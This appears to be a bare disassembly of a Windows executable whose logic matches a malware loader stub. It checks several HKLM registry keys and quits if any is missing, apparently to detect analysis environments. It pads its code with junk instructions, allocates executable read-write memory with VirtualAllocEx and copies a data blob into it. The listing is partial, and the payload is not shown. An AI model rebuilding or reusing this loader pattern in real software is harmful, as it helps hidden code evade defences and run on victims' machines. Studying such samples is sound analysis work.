0x00401000:	pushl	%ebp	; from: 0x0040173f(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0xc, %esp
0x00401006:	movl	0x8(%ebp), %eax
0x00401009:	movl	%eax, -8(%ebp)
0x0040100c:	movl	0xc(%ebp), %ecx
0x0040100f:	movl	%ecx, -12(%ebp)
0x00401012:	movl	$0x22b, -4(%ebp)
0x00401019:	movl	-8(%ebp), %edx
0x0040101c:	cmpl	-12(%ebp), %edx
0x0040101f:	jae	0x0040102f	; targets: 0x00401021(MAY)
0x00401021:	movl	$0x22b, -4(%ebp)	; from: 0x0040101f(MAY)
0x00401028:	movl	-8(%ebp), %eax
0x0040102b:	jmp	0x00401039	; targets: 0x00401039(MAY)
0x00401039:	movl	%ebp, %esp	; from: 0x0040102b(MAY)
0x0040103b:	popl	%ebp
0x0040103c:	ret	; targets: 0x00401744(MAY)

0x00401040:	pushl	%ebp	; from: 0x0040170c(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	subl	$0xc, %esp
0x00401046:	movl	$0x1e4dc, -8(%ebp)
0x0040104d:	movl	$0x3000, -12(%ebp)
0x00401054:	movl	$0x40, -4(%ebp)
0x0040105b:	movl	-4(%ebp), %eax
0x0040105e:	pushl	%eax
0x0040105f:	movl	-12(%ebp), %ecx
0x00401062:	pushl	%ecx
0x00401063:	movl	0x8(%ebp), %edx
0x00401066:	pushl	%edx
0x00401067:	pushl	$0x0
0x00401069:	pushl	$0xffffffff
0x0040106b:	call	VirtualAllocEx@kernel32.dll	; targets: 0xff000020(MAY)
0x00401071:	movl	%ebp, %esp
0x00401073:	popl	%ebp
0x00401074:	ret	; targets: 0x00401711(MAY)

0x00401080:	pushl	%ebp	; from: 0x00401721(MAY)
0x00401081:	movl	%esp, %ebp
0x00401083:	popl	%ebp
0x00401084:	ret	; targets: 0x00401726(MAY)

0x00401090:	pushl	%ebp	; from: 0x0040166c(MAY)
0x00401091:	movl	%esp, %ebp
0x00401093:	movl	$0x405004, 0x004032c4
0x0040109d:	popl	%ebp
0x0040109e:	ret	; targets: 0x00401671(MAY)

0x004010b0:	pushl	%ebp	; from: 0x004016fd(MAY)
0x004010b1:	movl	%esp, %ebp
0x004010b3:	movl	0x8(%ebp), %eax
0x004010b6:	movl	-4(%eax), %eax
0x004010b9:	popl	%ebp
0x004010ba:	ret	; targets: 0x00401702(MAY)

0x004012b0:	pushl	%ebp	; from: 0x0040175f(MAY)
0x004012b1:	movl	%esp, %ebp
0x004012b3:	subl	$0x22c, %esp
0x004012b9:	movl	$0x7c, -544(%ebp)
0x004012c3:	movl	$0x0, -532(%ebp)
0x004012cd:	movl	GetWindowsDirectoryW@kernel32.dll, %eax
0x004012d2:	movl	%eax, -4(%ebp)
0x004012d5:	pushl	$0x104
0x004012da:	leal	-528(%ebp), %ecx
0x004012e0:	pushl	%ecx
0x004012e1:	call	-4(%ebp)	; targets: 0xff000050(MAY)
0x004012e4:	movl	lstrcatW@kernel32.dll, %edx
0x004012ea:	movl	%edx, -548(%ebp)
0x004012f0:	movl	CreateFileW@kernel32.dll, %eax
0x004012f5:	movl	%eax, -536(%ebp)
0x004012fb:	movl	$0x0, -552(%ebp)
0x00401305:	jmp	0x00401316	; targets: 0x00401316(MAY)
0x00401307:	movl	-552(%ebp), %ecx	; from: 0x00401358(MAY)
0x0040130d:	addl	$0x1, %ecx
0x00401310:	movl	%ecx, -552(%ebp)
0x00401316:	movl	-552(%ebp), %edx	; from: 0x00401305(MAY)
0x0040131c:	cmpl	0x10(%ebp), %edx
0x0040131f:	jnl	0x0040135a	; targets: 0x0040135a(MAY), 0x00401321(MAY)
0x00401321:	movl	0xc(%ebp), %eax	; from: 0x0040131f(MAY)
0x00401324:	addl	-552(%ebp), %eax
0x0040132a:	movzbl	(%eax), %ecx
0x0040132d:	movl	%ecx, -556(%ebp)
0x00401333:	movl	$0x7c, -544(%ebp)
0x0040133d:	movl	0x8(%ebp), %edx
0x00401340:	addl	-552(%ebp), %edx
0x00401346:	movb	-556(%ebp), %al
0x0040134c:	movb	%al, (%edx)
0x0040134e:	movl	$0x33, -544(%ebp)
0x00401358:	jmp	0x00401307	; targets: 0x00401307(MAY)
0x0040135a:	movl	%ebp, %esp	; from: 0x0040131f(MAY)
0x0040135c:	popl	%ebp
0x0040135d:	ret	; targets: unresolved


start:
0x00401580:	pushl	%ebp
0x00401581:	movl	%esp, %ebp
0x00401583:	subl	$0x98, %esp
0x00401589:	movl	%ebp, 0x004033cc
0x0040158f:	pusha	
0x00401590:	movl	$0x0, -60(%ebp)
0x00401597:	movl	$0x80000002, -80(%ebp)
0x0040159e:	movl	$0x60, -132(%ebp)
0x004015a8:	movl	$0x40302c, -112(%ebp)
0x004015af:	movl	$0x403038, -128(%ebp)
0x004015b6:	movl	$0x3, -104(%ebp)
0x004015bd:	pushl	$0x1
0x004015bf:	call	ShowCursor@user32.dll	; targets: 0xff0000b0(MAY)
0x004015c5:	movl	$0x42, -132(%ebp)
0x004015cf:	movl	RegOpenKeyA@advapi32.dll, %eax
0x004015d4:	movl	%eax, 0x004033d0
0x004015d9:	movl	$0x6, -132(%ebp)
0x004015e3:	movl	-112(%ebp), %ecx
0x004015e6:	movb	$0x4f, 0x1(%ecx)
0x004015ea:	leal	-120(%ebp), %edx
0x004015ed:	pushl	%edx
0x004015ee:	movl	-112(%ebp), %eax
0x004015f1:	pushl	%eax
0x004015f2:	pushl	$0x80000002
0x004015f7:	call	0x004033d0	; targets: 0xff0000a0(MAY)
0x004015fd:	testl	%eax, %eax
0x004015ff:	je	0x00401608	; targets: 0x00401601(MAY), 0x00401608(MAY)
0x00401601:	xorl	%eax, %eax	; from: 0x004015ff(MAY)
0x00401603:	jmp	0x004018eb	; targets: 0x004018eb(MAY)
0x00401608:	movl	$0x60, -132(%ebp)	; from: 0x004015ff(MAY)
0x00401612:	leal	-120(%ebp), %ecx
0x00401615:	pushl	%ecx
0x00401616:	pushl	$0x40303c
0x0040161b:	movl	-120(%ebp), %edx
0x0040161e:	pushl	%edx
0x0040161f:	call	0x004033d0	; targets: 0xff0000a0(MAY)
0x00401625:	testl	%eax, %eax
0x00401627:	je	0x00401630	; targets: 0x00401629(MAY), 0x00401630(MAY)
0x00401629:	xorl	%eax, %eax	; from: 0x00401627(MAY)
0x0040162b:	jmp	0x004018eb	; targets: 0x004018eb(MAY)
0x00401630:	leal	-120(%ebp), %eax	; from: 0x00401627(MAY)
0x00401633:	pushl	%eax
0x00401634:	pushl	$0x403044
0x00401639:	movl	-120(%ebp), %ecx
0x0040163c:	pushl	%ecx
0x0040163d:	call	0x004033d0	; targets: 0xff0000a0(MAY)
0x00401643:	testl	%eax, %eax
0x00401645:	je	0x0040164e	; targets: 0x00401647(MAY), 0x0040164e(MAY)
0x00401647:	xorl	%eax, %eax	; from: 0x00401645(MAY)
0x00401649:	jmp	0x004018eb	; targets: 0x004018eb(MAY)
0x0040164e:	leal	-120(%ebp), %edx	; from: 0x00401645(MAY)
0x00401651:	pushl	%edx
0x00401652:	pushl	$0x403080
0x00401657:	movl	-120(%ebp), %eax
0x0040165a:	pushl	%eax
0x0040165b:	call	0x004033d0	; targets: 0xff0000a0(MAY)
0x00401661:	testl	%eax, %eax
0x00401663:	jne	0x0040166c	; targets: 0x0040166c(MAY), 0x00401665(MAY)
0x00401665:	xorl	%eax, %eax	; from: 0x00401663(MAY)
0x00401667:	jmp	0x004018eb	; targets: 0x004018eb(MAY)
0x0040166c:	call	0x00401090	; targets: 0x00401090(MAY)	; from: 0x00401663(MAY)
0x00401671:	movl	$0x64, -52(%ebp)	; from: 0x0040109e(MAY)
0x00401678:	movl	$0x14, -28(%ebp)
0x0040167f:	movl	$0x0, -60(%ebp)
0x00401686:	movl	$0x0, -36(%ebp)
0x0040168d:	movl	$0x1, -48(%ebp)
0x00401694:	movl	$0x0, -20(%ebp)
0x0040169b:	movl	$0x64, -52(%ebp)
0x004016a2:	movl	$0x14, -28(%ebp)
0x004016a9:	movl	$0x0, -60(%ebp)
0x004016b0:	movl	$0x0, -36(%ebp)
0x004016b7:	movl	$0x1, -48(%ebp)
0x004016be:	movl	$0x3, -24(%ebp)
0x004016c5:	movl	$0x0, -20(%ebp)
0x004016cc:	movl	$0x64, -52(%ebp)
0x004016d3:	movl	$0x14, -28(%ebp)
0x004016da:	movl	$0x0, -60(%ebp)
0x004016e1:	movl	$0x0, -36(%ebp)
0x004016e8:	movl	$0x1, -48(%ebp)
0x004016ef:	movl	$0x3, -24(%ebp)
0x004016f6:	movl	0x004032c4, %ecx
0x004016fc:	pushl	%ecx
0x004016fd:	call	0x004010b0	; targets: 0x004010b0(MAY)
0x00401702:	addl	$0x4, %esp	; from: 0x004010ba(MAY)
0x00401705:	movl	%eax, -64(%ebp)
0x00401708:	movl	-64(%ebp), %edx
0x0040170b:	pushl	%edx
0x0040170c:	call	0x00401040	; targets: 0x00401040(MAY)
0x00401711:	addl	$0x4, %esp	; from: 0x00401074(MAY)
0x00401714:	movl	%eax, -56(%ebp)
0x00401717:	movl	-64(%ebp), %eax
0x0040171a:	pushl	%eax
0x0040171b:	pushl	$0x0
0x0040171d:	movl	-56(%ebp), %ecx
0x00401720:	pushl	%ecx
0x00401721:	call	0x00401080	; targets: 0x00401080(MAY)
0x00401726:	addl	$0xc, %esp	; from: 0x00401084(MAY)
0x00401729:	movl	-64(%ebp), %edx
0x0040172c:	movl	%edx, -72(%ebp)
0x0040172f:	movl	-60(%ebp), %eax
0x00401732:	cmpl	-64(%ebp), %eax
0x00401735:	jae	0x00401787	; targets: 0x00401737(MAY)
0x00401737:	movl	-72(%ebp), %ecx	; from: 0x00401735(MAY)
0x0040173a:	pushl	%ecx
0x0040173b:	movl	-52(%ebp), %edx
0x0040173e:	pushl	%edx
0x0040173f:	call	0x00401000	; targets: 0x00401000(MAY)
0x00401744:	addl	$0x8, %esp	; from: 0x0040103c(MAY)
0x00401747:	movl	%eax, -76(%ebp)
0x0040174a:	movl	-76(%ebp), %eax
0x0040174d:	pushl	%eax
0x0040174e:	movl	0x004032c4, %ecx
0x00401754:	addl	-36(%ebp), %ecx
0x00401757:	pushl	%ecx
0x00401758:	movl	-56(%ebp), %edx
0x0040175b:	addl	-60(%ebp), %edx
0x0040175e:	pushl	%edx
0x0040175f:	call	0x004012b0	; targets: 0x004012b0(MAY)
0x004018eb:	movl	%ebp, %esp	; from: 0x00401667(MAY), 0x00401649(MAY), 0x00401603(MAY), 0x0040162b(MAY)
0x004018ed:	popl	%ebp
0x004018ee:	ret	; targets: 0xfee70000(MAY)

